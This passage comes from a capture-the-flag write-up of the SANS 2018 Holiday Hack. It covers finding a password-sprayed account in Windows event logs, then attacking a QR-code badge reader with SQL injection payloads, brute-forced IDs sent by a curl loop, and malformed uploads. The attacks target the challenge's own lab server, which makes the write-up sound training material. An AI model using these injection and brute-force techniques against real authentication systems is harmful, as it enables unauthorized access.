<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;aaron.smith&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;abhishek.kumar&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;adam.smith&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            [snip]</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;mike.miller&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;mike.smith&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;mike.williams&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="hll"><span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;minty.candycane&lt;/Data&gt;</span>
</span><span class="hll"><span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;minty.candycane&lt;/Data&gt;</span>
</span><span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;mohamed.ahmed&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;mohamed.ali&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;TargetUserName&quot;&gt;muhammad.ali&lt;/Data&gt;</span>
<span class="go">            &lt;Data Name=&quot;FailureReason&quot;&gt;%%2313&lt;/Data&gt;</span>
</pre></div>
<p>We can see that <code>minty.candycane</code> does not have a <code>FailureReason</code>
after her login event. This means that the password spraying attack worked
against her account. She's the account we're looking for:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@230a1d67fee6:~$</span> ./runtoanswer
<span class="go">Loading, please wait......</span>



<span class="hll"><span class="go">Whose account was successfully accessed by the attacker&#39;s password spray? minty.candycane</span>
</span>

<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMM   NM   M   NMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMM             MMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMW  KWMMNK       KWMMNK KMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMM       NMMM   MMM       WMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMW        K           NMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMN   MMMMMMMMMMMWK           KWMMMMMMMMMMM   WMMMMMMMMMMMM</span>
<span class="go">MMMMMMWK MMM    MMMMMMMMMMMMMMM      NMMMMMMMMMMMMMMM   KMMWKKWMMMMMM</span>
<span class="go">MMMMMM   KMM    MMMMMMMMMMMMN KNM   MN  WMMMMMMMMMMMM   KMM    MMMMMM</span>
<span class="go">M        KMM    MMMMMMMMMMMM             MMMMMMMMMMMM   KMM         M</span>
<span class="go">MMN       MM    MMMMMMMMMMMMMN        KWMMMMMMMMMMMMM   KMM       NMM</span>
<span class="go">MW              MMN   MMMMMWMMMMW   MMMMWWMMMMW   WMM             KMM</span>
<span class="go">M     KWMN      NMK   MMMN     NM   M      MMM    NM       NMNK     M</span>
<span class="go">MMWWMMW               WMM                  WMM               NMMMNWMM</span>
<span class="go">MMMN        NMMW       NMK   N        KK   WM       KMMW        KWMMM</span>
<span class="go">MM      KWMMMM               MMMM   MMMN               MMMMWK     KMM</span>
<span class="go">MMW KNMMMMMMMMK   WMMMW       NMM   MW        MMMMWK   MMMMMMMM  KWMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMW                            KWMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMW      WMMMMN       WMMMMN      MMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMN       K            K       KWMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMWKKWMMMMMMMMK   MMMMW        MM   MWK      KWMMMW    MMMMMMMMNKKMMM</span>
<span class="go">MM       WMMMM               MMMM   MMMN               MMMMWK     KMM</span>
<span class="go">MMMN        NMMW       NMK   NK       KK   WM       KWMM         NMMM</span>
<span class="go">MMWWMMWK              WMM                  WMM                MMMWMMM</span>
<span class="go">M      WMN      NMK   MMMN      M   W      MMM    NM       WMWK     M</span>
<span class="go">MW              MMN   MMMMMNMMMMM   MMMMWNMMMMW   WMM             KWM</span>
<span class="go">MMN       MM    MMMMMMMMMMMMMNK       KWMMMMMMMMMMMMM   KMM      KWMM</span>
<span class="go">M        KMM    MMMMMMMMMMMM             MMMMMMMMMMMM   KMM    K    M</span>
<span class="go">MWWMMM   KMM    MMMMMMMMMMMM    M   W   NMMMMMMMMMMMM   KMM    MMMWMM</span>
<span class="go">MMMMMMNKKMMM    MMMMMMMMMMMMMMMN    KWMMMMMMMMMMMMMMM   KMMWKKWMMMMMM</span>
<span class="go">MMMMMMMMMMMM    MMMMMMMMMMMWK            MMMMMMMMMMMM   WMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMM                    NMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMM        MMM   MMW       WMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMW  KWMMWK        WMMN  KMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMM             MMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMM    M   WK  NMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>
<span class="go">MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</span>

<span class="go">Silly Minty Candycane, well this is what she gets.</span>
<span class="go">&quot;Winter2018&quot; isn&#39;t for The Internets.</span>
<span class="go">Passwords formed with season-year are on the hackers&#39; list.</span>
<span class="go">Maybe we should look at guidance published by the NIST?</span>

<span class="go">Congratulations!</span>
</pre></div>
<p>To solve this challenge, we can also be a bit fancy, and use a Python script
to parse the XML file:</p>
<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">import</span> <span class="nn">datetime</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">&#39;Usage: {} &lt;xml_event_file&gt;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># This set will hold every user without a FailureReason attribute</span>
    <span class="n">user_set_with_no_failure</span> <span class="o">=</span> <span class="nb">set</span><span class="p">()</span>

    <span class="c1"># The date of the spray attack was determined manually, by looking at the</span>
    <span class="c1"># date of the attack against aaron.smith</span>
    <span class="n">spray_attack_beginning</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="s1">&#39;2018-09-10 13:03:33&#39;</span><span class="p">,</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">)</span>

    <span class="c1"># We open and parse the file</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(),</span> <span class="s1">&#39;lxml&#39;</span><span class="p">)</span>

    <span class="k">for</span> <span class="n">evt</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">events</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;event&#39;</span><span class="p">):</span>
        <span class="c1"># We check the date of every event.</span>
        <span class="c1"># If it&#39;s before the attack, we don&#39;t look at it</span>
        <span class="n">event_time</span> <span class="o">=</span> <span class="n">evt</span><span class="o">.</span><span class="n">system</span><span class="o">.</span><span class="n">timecreated</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;systemtime&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
        <span class="n">event_time</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">strptime</span><span class="p">(</span><span class="n">event_time</span><span class="p">,</span> <span class="s1">&#39;%Y-%m-</span><span class="si">%d</span><span class="s1"> %H:%M:%S&#39;</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">event_time</span> <span class="o">&lt;</span> <span class="n">spray_attack_beginning</span><span class="p">:</span>
            <span class="k">continue</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">evt_data</span> <span class="o">=</span> <span class="n">evt</span><span class="o">.</span><span class="n">eventdata</span>
            <span class="c1"># If there&#39;s no failure reason, we add our user to our result set.</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">evt_data</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;FailureReason&#39;</span><span class="p">}):</span>
                <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">evt_data</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="n">attrs</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="s1">&#39;TargetUserName&#39;</span><span class="p">}):</span>
                    <span class="n">user_set_with_no_failure</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">user</span><span class="o">.</span><span class="n">string</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;@EM.KRINGLECON.COM&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>

    <span class="c1"># We print our result set</span>
    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">user_set_with_no_failure</span><span class="p">))</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="gp">$</span> ./parse_xml.py ./ho-ho-no.xml
<span class="go">HealthMailboxbe58608</span>
<span class="go">HealthMailboxbe58608d4925422d8e4ea458cfedc612</span>
<span class="go">SYSTEM</span>
<span class="go">WIN-KCON-EXCH16$</span>
<span class="go">HealthMailboxbab78a6</span>
<span class="go">wunorse.openslae</span>
<span class="go">minty.candycane</span>
</pre></div>
<p>Along with some users we don't care about, the script gives us
<code>minty.candycane</code> and <code>wunorse.openslae</code>. With some manual analysis
of the XML file, we can determine that the right user is
<code>minty.candycane</code>.</p>
</div>
<div class="section" id="bypassing-the-door-authentication-mechanism">
<h3><a class="toc-backref" href="#id25">Bypassing the door authentication mechanism</a></h3>
<div class="section" id="the-haxxor-way">
<h4><a class="toc-backref" href="#id26">The &quot;haXXor&quot; way</a></h4>
<p>We want to open <a class="reference external" href="https://scanomatic.kringlecastle.com/index.html">the door next to Pepper Minstix</a>, but we need a badge to do
so. The door needs to scan a QR code. It can do so by using your webcam (you
then need to click on the fingerprint reader), or you can upload a QR code
image using the USB dongle. Luckily for us, Alabaster Snowball lost his badge,
and we managed to get our hands on it:</p>
<img alt="alabaster_badge.png" class="align-center" src="/images/sans-christmas-challenge-2018/alabaster_badge.png" />
<p>If we try to scan this badge, we're told that the user was disabled. Probably
because the badge was lost.</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/upload</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">scanomatic.kringlecastle.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">https://scanomatic.kringlecastle.com/index.html</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------5162445520959346741824970383</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">153774</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">resource_id=false</span>

-----------------------------5162445520959346741824970383
Content-Disposition: form-data; name=&quot;barcode&quot;; filename=&quot;alabaster_badge.png&quot;
Content-Type: image/png

PNG [snip, content of the PNG file]
-----------------------------5162445520959346741824970383
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 03 Jan 2019 12:57:34 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">70</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="hll"><span class="p">{</span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;Authorized User Account Has Been Disabled!&quot;</span><span class="p">,</span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">}</span>
</span></pre></div>
<img alt="scanomatic_user_disabled.gif" class="align-center" src="/images/sans-christmas-challenge-2018/scanomatic_user_disabled.gif" />
<p>So, we need to create our own badge. If we scan Alabaster's badge with a QR
code reader, we get <code>oRfjg5uGHmbduj2m</code>.</p>
<p><strong>And this is where I lost sooooo much time</strong>. For the purpose of completeness,
let's see all of my dead ends, yay! If you just want the solution, feel free to
<a class="reference external" href="#the-right-solution">jump directly to it</a>.</p>
<div class="section" id="all-the-dead-ends-yay">
<h5><a class="toc-backref" href="#id27">All the dead ends, yay!</a></h5>
<p>The QR-encoded message looks like a base64-encoded string. Let's decode it:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nb">echo</span> -n oRfjg5uGHmbduj2m <span class="p">|</span> base64 -d <span class="p">|</span> hexdump -C
<span class="go">00000000  a1 17 e3 83 9b 86 1e 66  dd ba 3d a6              |.......f..=.|</span>
<span class="go">0000000c</span>
</pre></div>
<p>This gives us a 12 byte identifier, <code>0xa117e3839b861e66ddba3da6</code>. My
first idea was that, since we have to bypass authentication, let's try a SQL
injection in this id. However, I thought that, since the id <strong>seemed to be
base64-encoded</strong>, I'd have to base64-encode my payload. Let's generate a QR
code with our SQL injection payload. I'm using the <code>qrtools</code> Python
library:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">qrtools</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">base64</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">qr</span> <span class="o">=</span> <span class="n">qrtools</span><span class="o">.</span><span class="n">QR</span><span class="p">()</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">qr</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="s1">&#39;foo&quot;</span><span class="se">\&#39;</span><span class="s1">#;-- &#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">qr</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;sqli_detection.png&#39;</span><span class="p">)</span>
</pre></div>
<p>I'm first trying a simple payload, which just tries to break the SQL syntax.</p>
<p>However, it did not work:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/upload</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">scanomatic.kringlecastle.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">https://scanomatic.kringlecastle.com/index.html</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------49127043815591531222123518543</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">580</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">resource_id=false</span>

-----------------------------49127043815591531222123518543
Content-Disposition: form-data; name=&quot;barcode&quot;; filename=&quot;sqli_detection.png&quot;
Content-Type: image/png

PNG [snip]
-----------------------------49127043815591531222123518543
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 03 Jan 2019 13:09:43 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">61</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="hll"><span class="p">{</span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;No Authorized User Account Found!&quot;</span><span class="p">,</span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">}</span>
</span></pre></div>
<p>Hmm, it did not work. Our payload should have broken the SQL syntax. Instead,
we got a message saying that the provided user id does not exists. I then
thought that maybe we had to find a valid, active user id. I decided to try
bruteforcing the id close to Alabaster's id, to find an active, existing user:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1000</span><span class="p">):</span>
<span class="gp">... </span>    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
<span class="gp">... </span>            <span class="n">user_id</span> <span class="o">=</span> <span class="mh">0xa117e3839b861e66ddba3da6</span> <span class="o">+</span> <span class="n">i</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">**</span><span class="n">j</span>
<span class="gp">... </span>            <span class="n">qr</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">format</span><span class="p">(</span><span class="n">user_id</span><span class="p">,</span> <span class="s1">&#39;02X&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">))</span>
<span class="gp">... </span>            <span class="n">qr</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;id_bruteforce/{}.png&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">user_id</span><span class="p">))</span>
<span class="gp">...</span>
</pre></div>
<p>Bam! 2000 QR codes. Let's use <code>curl</code> to upload them all:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="nb">cd</span> id_bruteforce
<span class="gp">$</span> ls -1 <span class="p">|</span> <span class="k">while</span> <span class="nb">read</span> f<span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$f</span><span class="p">;</span> curl -b <span class="s1">&#39;resource_id=false&#39;</span> -F <span class="s2">&quot;barcode=@</span><span class="nv">$f</span><span class="s2">&quot;</span> https://scanomatic.kringlecastle.com/upload &gt; ./results/<span class="nv">$f</span>.txt<span class="p">&amp;</span> <span class="k">done</span>
</pre></div>
<p>I'll spare you the suspense, it did not work. I always got the same message,
<code>No Authorized User Account Found!</code>. I also noticed that the id seemed
to be case insensitive. For example, Alabaster's id, sent as
<code>oRfjg5uGHmbduj2m</code> or <code>oRfjg5uGHmbduj2M</code> gave the same message,
<code>Authorized User Account Has Been Disabled!</code>. I then tried bruteforcing
the base64 message itself. I mean, a 16 character string, with only lower case
letters and numbers (I decided to ignore symbols) is still 83 bits of entropy,
but I was desperate. Needless to say, it did not work.</p>
<p>I then decided to attack the webserver directly by sending malformed images:</p>
<div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/upload</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">scanomatic.kringlecastle.com</span>
<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0</span>
<span class="na">Accept</span><span class="o">:</span> <span class="l">application/json, text/javascript, */*; q=0.01</span>
<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3</span>
<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
<span class="na">Referer</span><span class="o">:</span> <span class="l">https://scanomatic.kringlecastle.com/index.html</span>
<span class="na">X-Requested-With</span><span class="o">:</span> <span class="l">XMLHttpRequest</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=---------------------------49127043815591531222123518543</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">219</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">resource_id=false</span>

-----------------------------49127043815591531222123518543
Content-Disposition: form-data; name=&quot;barcode&quot;; filename=&quot;empty.png&quot;
Content-Type: image/png

-----------------------------49127043815591531222123518543--
</pre></div>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 03 Jan 2019 13:31:50 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">124</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="p">{</span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;EXCEPTION AT (LINE 151 \&quot;qr.decode(full_path)\&quot;): cannot identify image file &#39;uploads/empty.png&#39;&quot;</span><span class="p">,</span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">}</span>
</pre></div>
<p>Finally! An error message with a partial path disclosure. I then thought that
it might be an upload vulnerability with a race condition, that I had to upload
a file and access it via
<a class="reference external" href="https://scanomatic.kringlecastle.com/uploads/my_evil_file">https://scanomatic.kringlecastle.com/uploads/my_evil_file</a> before it's deleted,
but this was another dead-end.</p>
</div>
<div class="section" id="the-right-solution">
<h5><a class="toc-backref" href="#id28">The right solution</a></h5>
<p>I almost gave up and checked the clue given by Pepper Minstix, but I first
decided to try one last thing: send a random string that I would QR-encode:</p>
<div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">string</span>
<span class="gp">&gt;&gt;&gt; </span><span class="kn">import</span> <span class="nn">random</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">random_payload</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">printable</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2000</span><span class="p">))</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">qr</span><span class="o">.</span><span class="n">data</span> <span class="o">=</span> <span class="n">random_payload</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">qr</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;qr_random.png&#39;</span><span class="p">)</span>
</pre></div>
<p>Here's the image that saved me:</p>
<img alt="qr_random.png" class="align-center" src="/images/sans-christmas-challenge-2018/qr_random.png" />
<p>I uploaded it, and fot the following error message:</p>
<div class="highlight"><pre><span></span><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="o">:</span> <span class="l">nginx/1.10.3</span>
<span class="na">Date</span><span class="o">:</span> <span class="l">Thu, 03 Jan 2019 13:37:14 GMT</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
<span class="na">Content-Length</span><span class="o">:</span> <span class="l">433</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>

<span class="hll"><span class="p">{</span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="s2">&quot;EXCEPTION AT (LINE 96 \&quot;user_info = query(\&quot;SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = &#39;{}&#39; LIMIT 1\&quot;.format(uid))\&quot;): (1064, u\&quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;G7M]aa-!EcgKBlTx0&amp;&lt;50Y&amp;\\rV&#39;CEB@ZbfO2Z~HkVC5=lH6&gt;!bSl^L~9(}Lh;T^-PXCShXg{ik3H%_ A\\x0c&#39; at line 1\&quot;)&quot;</span><span class="p">,</span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="kc">false</span><span class="p">}</span>
</span></pre></div>
<img alt="scanomatic_sql_error.gif" class="align-center" src="/images/sans-christmas-challenge-2018/scanomatic_sql_error.gif" />
<p>Hurray! A SQL error message, which gives us the full syntax. So there was
indeed a SQL injection, however I shouldn't have base64-encoded it. So here's
the request:</p>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="n">first_name</span><span class="p">,</span><span class="n">last_name</span><span class="p">,</span><span class="n">enabled</span> <span class="k">FROM</span> <span class="n">employees</span> <span class="k">WHERE</span> <span class="n">authorized</span> <span class="o">=</span> <span class="mi">1</span> <span class="k">AND</span> <span class="n">uid</span> <span class="o">=</span> <span class="s1">&#39;&lt;id_goes_here&gt;&#39;</span> <span class="k">LIMIT</span> <span class="mi">1</span>
</pre></div>
<p>Seems like your basic SQL injection, let's generate a paylaod that will select
the first enabled user:</p>
